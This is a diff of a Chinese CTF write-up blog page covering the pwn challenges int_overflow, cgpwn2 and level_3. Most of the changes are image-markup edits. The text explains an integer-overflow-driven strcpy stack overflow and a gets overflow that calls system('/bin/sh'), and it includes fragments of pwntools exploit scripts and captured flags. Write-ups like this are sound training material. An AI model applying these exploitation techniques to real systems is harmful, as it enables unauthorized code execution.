 <p>得到flag:cyberpeace{de6b4ebe0aab9472c1dda38729fc76ef}</p>
-<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H8e47c49cc69745ef8f0dd69edf28ec14I.png" alt title class>
-                <p></p>
-            </figure>
-
+<h2 id="int-overflow"><a href="#int-overflow" class="headerlink" title="int_overflow"></a>int_overflow</h2><p><img src="https://ae01.alicdn.com/kf/H8e47c49cc69745ef8f0dd69edf28ec14I.png" alt></p>
 <p>先跑下 发现是一个类似登陆的系统 要求输入密码bulabula…没啥直接思路</p>
 <p>32位的程序 丢进IDA看下程序流程</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H1e6e4439979b4a85a11b2a8ff19862ber.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H1e6e4439979b4a85a11b2a8ff19862ber.png" alt></p>
 <p>主函数还是一样的寂寞..什么有价值的都没有呢…但是在函数表里发现一个敏感函数what_is_this</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H3c6b0310b34e46738863aee4be442848Z.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H3c6b0310b34e46738863aee4be442848Z.png" alt></p>
 <p>那起码能确定肯定是溢出类的题目了 最后劫持程序流向what_is_this函数</p>
 <p>跟进login函数 也没啥发现 check函数主要就是录入了用户名和密码 本来看见read函数 以为溢出点就在这里了..打开栈图一看发现覆盖不到返回地址…继续向下跟进check_passwd函数</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H431013789c004197b1ef8984139dbefbQ.png" alt title class>
-                <p></p>
-            </figure>
-
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hdf7b08d1a7d94d128d68c1a1df79bc7fC.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H431013789c004197b1ef8984139dbefbQ.png" alt></p>
+<p><img src="https://ae01.alicdn.com/kf/Hdf7b08d1a7d94d128d68c1a1df79bc7fC.png" alt></p>
 <p>简单解释下程序流程 这里的s就是之前我们录入的密码 check_passwd函数首先检测s的长度 要求s的长度在3到8之间</p>
 <p>在走过if后 发现另外一个敏感函数 <kbd>strcpy</kbd> 这个函数一样不检测长度 可以直接覆盖无限大的空间..<br>查看一下栈图 dest函数到返回地址的距离是14个字节 但是我们的密码最多只能输入8位…这时候注意到题目名..整型溢出..百度了一下..</p>
 <p>注意一下变量v3的定义方式 是一个八位的无符号整型数 也就是最大255 如果大于255 就会清零从头计数 那么基本思路就有了 简单来说就是将密码长度设为258-263位之间 同时对应好位置 直接把返回地址覆写即可</p>
@@ -895,30 +704,14 @@ payload<span class="token operator">=</span><span class="token string">'a'</span
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>运行脚本即可</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H646dc7782e7f4029a6dadd5251eda1f65.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H646dc7782e7f4029a6dadd5251eda1f65.png" alt></p>
 <p>得到flag:cyberpeace{85f5a37cbe589f048f01f85b41e6f421}</p>
 <h2 id="cgpwn2"><a href="#cgpwn2" class="headerlink" title="cgpwn2"></a>cgpwn2</h2><p>保护</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H291662a9388b451f96af988216f86aa5A.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H291662a9388b451f96af988216f86aa5A.png" alt></p>
 <p>运行程序啥都看不出来 就让输入个用户名和留言 拖入IDA吧</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/He43b12a532d641dba8da9e19bcd2dc86d.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/He43b12a532d641dba8da9e19bcd2dc86d.png" alt></p>
 <p>主函数什么都没有 直接往下跟</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hec3d211d6b3c4119b1af6b27a21cf1feE.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hec3d211d6b3c4119b1af6b27a21cf1feE.png" alt></p>
 <p>在hello函数的最后发现敏感函数gets 不用纠结函数上面写的是在干嘛..反正对函数主体以及我们的输入没有关系 不用管..同时在函数表中发现<kbd>system</kbd>函数 那么基本思路明确 通过gets函数劫持程序流向system函数 直接在栈里构造出来system函数调用<kbd>/bin/bash</kbd>的情况即可</p>
 <p>接下来就是脚本了</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -937,19 +730,11 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <blockquote>
 <p>这里解释下脚本为什么在名字部分写入/bin/sh而binaddr又是什么东西<br>因为在编写脚本的时候 我们不可能直接将字符串写入栈 让system函数去调用 需要我们提前将/bin/sh写入程序 而上面的名字录入就是一个最好的位置</p>
 <p>我们可以看一下name变量存在的位置</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H159c90dd87c9421292ac5b7a69ce4e34o.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H159c90dd87c9421292ac5b7a69ce4e34o.png" alt></p>
 <p>可以明确看到 name变量是存在bss段的静态变量 我们完全可以把/bin/sh先写入name变量 然后让system函数去调用</p>
 </blockquote>
 <p>执行脚本即可</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Ha63ae34bd918413e852ef834e5940b7em.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Ha63ae34bd918413e852ef834e5940b7em.png" alt></p>
 <p>得到flag:cyberpeace{d0a41c2065b348cf58cbb94c96ee57e6}</p>
 <h2 id="level-3"><a href="#level-3" class="headerlink" title="level_3"></a>level_3</h2><p>该题附件缺失 少了一个libc文件 没啥办法..略..</p>
 <script>
@@ -1394,7 +1179,7 @@ int main(void)
             | Theme <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
             <br>
             
-             <i class="fas fa-chart-area"></i> 站点总字数: <span class="white-color">17.7k</span> 字
+             <i class="fas fa-chart-area"></i> 站点总字数: <span class="white-color">19.5k</span> 字
             
             
             
